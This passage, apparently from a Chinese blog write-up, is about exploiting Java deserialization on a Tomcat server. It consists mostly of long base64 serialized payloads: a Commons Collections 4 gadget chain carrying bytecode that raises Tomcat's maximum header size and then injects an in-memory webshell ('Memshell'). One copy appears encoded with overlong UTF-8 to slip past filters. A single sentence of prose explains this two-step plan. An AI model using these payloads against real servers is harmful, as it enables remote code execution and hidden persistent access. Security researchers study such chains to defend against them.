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</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>准备打内存马，由于header长度会被限制。所以先将header长度限制修改，再打入内存马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyAC7BqsGhwbbBocCuwbXBtMGpwazArsGQwbLBqcGvwbLBqcG0wbnBkcG1waXBtcGllNowtPs/grEDAAJJAAjBs8GpwbrBpUwAFMGjwa/BrcGwwaHBssGhwbTBr8GydAAswYzBqsGhwbbBocCvwbXBtMGpwazAr8GDwa/BrcGwwaHBssGhwbTBr8GywLt4cAAAAAJzcgCEwa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGjwa/BrcGwwaHBssGhwbTBr8GywbPArsGUwbLBocGuwbPBpsGvwbLBrcGpwa7Bp8GDwa/BrcGwwaHBssGhwbTBr8GyL/mE8CuxCMwCAAJMABLBpMGlwaPBr8GywaHBtMGlwaRxAH4AAUwAFsG0wbLBocGuwbPBpsGvwbLBrcGlwbJ0AFrBjMGvwbLBp8CvwaHBsMGhwaPBqMGlwK/Bo8Gvwa3BrcGvwa7Bs8CvwaPBr8GswazBpcGjwbTBqcGvwa7Bs8C0wK/BlMGywaHBrsGzwabBr8Gywa3BpcGywLt4cHNyAIDBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaPBr8GtwbDBocGywaHBtMGvwbLBs8CuwYPBr8GtwbDBocGywaHBosGswaXBg8Gvwa3BsMGhwbLBocG0wa/Bsvv0mSW4brE3AgAAeHBzcgB2wa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGmwbXBrsGjwbTBr8GywbPArsGDwajBocGpwa7BpcGkwZTBssGhwa7Bs8Gmwa/BssGtwaXBsjDHl+woepcEAgABWwAawanBlMGywaHBrsGzwabBr8Gywa3BpcGywbN0AFzBm8GMwa/BssGnwK/BocGwwaHBo8GowaXAr8Gjwa/BrcGtwa/BrsGzwK/Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTAr8GUwbLBocGuwbPBpsGvwbLBrcGlwbLAu3hwdXIAXMGbwYzBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/B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YW5nL0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwB1BwB2BwBZBwBkBwBxAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAeTW9kaWZ5VG9tY2F0TWF4SGVhZGVyU2l6ZS5qYXZhDAAnACgBABBqYXZhL2xhbmcvVGhyZWFkAQAKZ2V0VGhyZWFkcwEAD2phdmEvbGFuZy9DbGFzcwwAdwB4BwB1DAB5AHoBABBqYXZhL2xhbmcvT2JqZWN0DAB7AHwMAH0AfgEABGh0dHAHAH8MAIAAgQEACEFjY2VwdG9yDACCAIMMAIQAhQcAdgwAhgCHAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uAQAGdGhpcyQwDACIAIMBAC9vcmcvYXBhY2hlL2NveW90ZS9odHRwMTEvQWJzdHJhY3RIdHRwMTFQcm90b2NvbAEABTQwOTYwBwCJDACKAIsMAIwAjQEAIm9yZy9hcGFjaGUvY295b3RlL0Fic3RyYWN0UHJvdG9jb2wMAIoAjgcAjwEAM29yZy9hcGFjaGUvdG9tY2F0L3V0aWwvbmV0L0Fic3RyYWN0RW5kcG9pbnQkSGFuZGxlcgwAkAAoAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAkQAoDAAuACgBAAhFZ0VkZUVJTwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3RyaW5nAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcv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</span><br><span class="line"></span><br><span class="line">rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAALr7K/rq+AAAAMQGWAQAITWVtc2hlbGwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQANZ2V0VXJsUGF0dGVybgEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAApMTWVtc2hlbGw7AQACLyoIAAwBAAxnZXRDbGFzc05hbWUBAAhJbmplY3RvcggADwEAD2dldEJhc2U2NFN0cmluZwEACkV4Y2VwdGlvbnMBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwATAQAQamF2YS9sYW5nL1N0cmluZwcAFQEQgEg0c0lBQUFBQUFBQUFJMVlDWHdVMVIzKy90bE5ack9zZ0FtQ0FUa1Z5TDJBNFVxQ2toQ1FRQktPWUREZ05kbE1rb1hON3JKSFNFUkF2Q2hlZUxmMnNIZXhyYllJc2tta0tqMnNyZmF3cDcxUGU5dVczdHFxOUhzenM4UG1RUGdCTTIvZisxL3YrNS9EaTI4Ly9TeUErZkt3d0ZNZjNtWUVFcEdZQmhGY3NFM3YwZjBoUGR6cFh4SFM0L0dHaU41dThNZ2xXQnlKZGZyajBWZ3czTmtSMDd1Tm5aSFlkdjlPbzgwZk4ySTlJU1BocjRuM2hRT3I5WEI3eUlqVmh4TkdMR0JFVGJuWmdwenFZRGlZdUV6Z0tpeHFFYmhYUk5vTndiaUdZTmhvU25hM0diRk5lbHVJTzNrTmtZQWVhdEZqUWZYYjNuUW51b0p4Z2JjaGJXb1ZEZkpCZzhlTHNSZ25tRnpZTUtyZFZVcVgzQ0NZZElaekplUjhKV1FDYVU2VE5DZlVMV3VUd1pCNStZbTJya200a01aRXlhNE1IVTVPWVpNeEpSZFp1SWozMWFOUkk5d3VLQ3NjU1ZnMFlzdFdSUkhUTUYwcG1rR2t0aHQ5UHN5eVJGN3NuTXlteXhJUmkwMHdvWENrTUVxWmkwSkZXMFFwM2UwTEJYUE95UW95bHFEVVMzVmxhbVVxOWhQQURZeUx3cTIxUmNOQnJCSmtCZHI0MkZvckdOTnVkTkNiNWdIQkpIMTkvVWdPSHhaaWtRSjhNZVgyQ2pUU2JTbFMvUG1uU1ZmMnFzZ0pSc0lhcUVJQ1ZHOEs2dlVIWW4wTUtmK0tZTFNMYU5FWlBYcXNJbjA4akZteDBoTHA1cjh0R2lwc0ZjT0VhRmdwT0s4NW9RZTJOK3BSTytCY05TdWJQVmpOUzNVYWlmcHdQS0dIQTl3dU9pT0t3eTN6WVEzV2VyRUtEWUxwUXdqaVVTUGdiellDTVNPeDF1aHI1aThOVFk2YjF3dkdEMWVoWVNOZFRrTnEreElHTCtRdUpGNCtiTUtWWGpTanhiUlR3VDJLYlMwcWNGdTlXSWN0NUZNWnFFanJMY3E0RVVqR2dvaytQKzB3U2EvR05jcmthK21WOXNpcVlGZ1BNWTZWMzVXNjY2R3JRM283TnhvenJDd1h0QmZhMTAvWGdLNUVJdXBmelVlenRiSFIySkUwNG9tcXM1TEZvNUZ3M0tqS3VNUzZOcFhzVlVVMGZjYnBYY3NiaWFDdVhKd1JLQjFEcVVJaG8xTVAxUVFDUmp5ZVFkWEZXT2dZbXJ5MkdoN3dQcGtPM21oMGhIZ1M3REhXUlkzWVVIMVZLc05qc1hWSkFqcmQ0Z2xHL01wQk5iR1kzc2Y5YURKQkx4aDZOMG0xT0swZ0YwMDhNdzRtaFFycGRqMmhreWRtSVNlWWU0NFFNMGhpTm96cGk1d0Q0TlRVWlpWc3diUjNOazRERTNiMk9SbWpnVVYzenJtWm9PSEdJVkZ2T1VUREhzSFVkMFJXdzAyMmtyTTdUTVBOYkNCZGhxcjZUV3hlUHR4cVpkeHRER2ptMW1yenhJZjlLQjJEWFhpWGMzNkhzM2NYeTRFbG9FVVBKU25oSG92aUlJRVBSTUlKUFJobWRrNFowb3E2OUZpelFvVGxnNEhzdzMyNFh5WHRBN1NGU3B2VFlUR3JzT2hzZ2VIRFEzaFltZkZ1cDgwOEl2QlJ5bnBkZGVPRXN2NTlscVh2NTUzYUZsWFVHUUd6eTA0Y3JXeXBuSDRVSDFURi9rTStMRVdsV24yRTBSRFYrMEpzamg1OHpCSmZreUJIV3pKaG5MMkwyS25rd3lkd2FBejY4SmdwUkpVdXV5dmtGNDdXRVQ2Tng3M1lpeWM0RHd3NzFQQlp3ZGcwdjlXekJRVWpwVGp0L0VrYzhlSXdqdHFOUFF2SGZKaVBCV3JWei92RWg5eG43aWozR2FVQXNUUU80bWwxb2VQMFd6UU5kOXlEWit5VFhYak9IaEgyNGZPOHRJUEFseGd6WVdQbjZSWXl0Rjg3Z0gwWkx5aXp2OEpSSmlPZWs2eHozVVpHREw4b3VERFQ1azFkc2NoTzFiTHNVdjgxTDE3QzExbWJHSE42S0s3YTltZ0YxWWR2NG1VRitiZWMxWGVzTk5qTWhxQWducFEyazdtM25yallCN1QwZS9qK0dPekdLODZBOEVOeXhwTnRjWHNnbVZnNHRPMDdrOFdQOFJNVitqOU5kL3Foa2pYOFhKQzlVNjJIV1ozUnkzNkpYM254Qy96YW5tLzI0amVPUGI4ajBJbUlVeVo4K0lOcWovdndSeWUyWDZQNzIvUzRzYWhpWlRpZEYwTm5Hc2ZVditDdml1T2tvL0h2anA1L092Zit0N0x6VEZkOVhWMzFEWWYvZjR3Yng0MTB5OVJoSGJpUlNhNTNHblhCVHF1UXV6Z2Q4TmxZdDlERHZvUXA3MEN0U1paZy9wa1Q4d3c2T0tDSTJ5c3V5VTVQRXFJeGJrSkd1RFBSWlU3cDlUN0pGYTg2R01PRFpKUnR5YkRtTlRxNHhTZm55VmpGeitsN2dxbW9XMDkwK1d1RG5Xcnk3NlJENVh5eXRadmFmSkpQRlNTZW9BYUtlcUt1b2xVbWVpVlBKaWxudnE1V0JhWUxyK1RjSEZ0QlAvbGtpbkp5czNDYTFpeVhNVEJ6TEJjS3poOWxHRlhUNENLT28yMkVPTHRIRldtN3NaUW5FOEZRZWEzSjZwRkxLTEFqWXJZQjlyT3oxRFM3U01rY21jc01sVUtyY3R2MmVLU1l3OFRXRWVTYWxGcjUxR2drdWlMOENsZytpcGFSYkpsNlkxWXo4MXNTYUVDNStKVUI4NWcvVzBjbXRTWUxXQnZPeEs0SkVjc0pobnNpMjNubHBhTVVoVkZFamxhb1pKRXM5c3BDV1pLdTJsTEpBbTJZYUd5eVAwbzhVdTFZZTVuRHNaejVGaytHeTd1RDhVQjViVTN6eW5RZUVzUmFCOTY2ZENtVVZZNkcxYXFlbWFRZVdlTklibkFrTjZsNTFiQkZYZUtJMm1oNXFpNTlzc2xoYlhGWXIzS1ViRkhCYWxoS3JuWW9yM1Vvcng5cHZpTzV6ZEhaN3BqZjRVaG1OdmtzeWJYSmpnNUZ2ODJSSDNMa2N3andWQWRDNWtkeSttdFRkcVJidmNUVG4zK1NUSDhyeUU1bnJ5Lzl3U2U3MGw5d3NqdGRxR1N2QjVNZFFaeUN4bDhhV0dUTWExdWlMdzNNWDdoZ1FZWHVrVnNkb2Jmelk2aTNqSVlZNFVTWm1rUTk0c3hDY2djTFEyOXZyMGZ1U2c4L2NrL20rWDJaSnc5aUpxdWttK1VyQjluSVZkWUE4Q2hEelBjczh5MksxM3pmWTc1enVlTHQrY3pscnhwS0VMN3ppL3N4dmpoZkRoeVRPL202KzVnY2ZKTGJXZkR5cVVvMWNCSHlNQlZqdVBKWkxIeWZad3JtSUdDTEM1RlMwYzRyTHVuSEJSUjA3ekc1bjY4SGpzbER4ekdwdFI4RlJ6QTFoWmxIY0VrS2MxSW9Ia0Q1VWN3N3JXc3NYSHpPb1BTWjhQTUtTdDlFUzZhdFQ2M3llSzdxTmdjUFcvTXlBcUdvY290TFhDWFA5bVBKWVVka2ptbnVuQXhSdVk2b1hGeUtDbE1VbTVndDZoVnl1UGt1eWFzZlFHTlQyVVdQUUhNZmdqdjdPTmExSHNHR0ZEYm5YZFdQcl